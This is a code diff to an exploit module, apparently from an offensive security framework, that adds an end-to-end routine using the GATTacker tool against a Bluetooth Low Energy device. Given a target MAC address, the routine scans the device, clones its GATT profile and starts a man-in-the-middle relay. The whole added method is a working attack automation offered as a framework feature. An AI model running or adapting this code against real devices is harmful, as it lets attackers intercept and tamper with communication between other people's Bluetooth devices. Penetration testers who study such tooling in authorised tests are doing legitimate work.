@@ -201,3 +201,47 @@ class Exploit(Exploit):
             handler()
         else:
             print_error(f"Unknown mode: {op}")
+
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E exploit: GATTacker MitM attack on BLE device."""
+        op = str(self.mode).strip().lower()
+        if op != "gattacker_mitm":
+            return
+
+        gattacker = _which("gattacker")
+        if not gattacker:
+            return
+
+        target_mac = str(getattr(self, "target", "")).strip()
+        if not target_mac:
+            print_warning("Sem target MAC para MitM")
+            return
+
+        cmd_scan = [gattacker, "-s", target_mac]
+        print_status(f"E2E: Scanning target {target_mac}...")
+        try:
+            subprocess.run(cmd_scan, capture_output=True, timeout=15, check=False)
+        except Exception:
+            pass
+
+        cmd_clone = [gattacker, "-c", target_mac]
+        print_status("E2E: Cloning GATT profile...")
+        try:
+            subprocess.run(cmd_clone, capture_output=True, timeout=15, check=False)
+        except Exception:
+            pass
+
+        cmd_mitm = [gattacker, "-m", target_mac]
+        print_status("E2E: Starting MitM relay...")
+        try:
+            result = subprocess.run(cmd_mitm, capture_output=True, timeout=30, check=False)
+            if result.returncode == 0:
+                print_success("MitM relay ativo")
+            else:
+                print_warning(f"GATTacker retornou código {result.returncode}")
+        except subprocess.TimeoutExpired:
+            print_info("GATTacker MitM timeout (30s)")
+        except Exception as exc:
+            print_error(f"GATTacker falhou: {exc}")
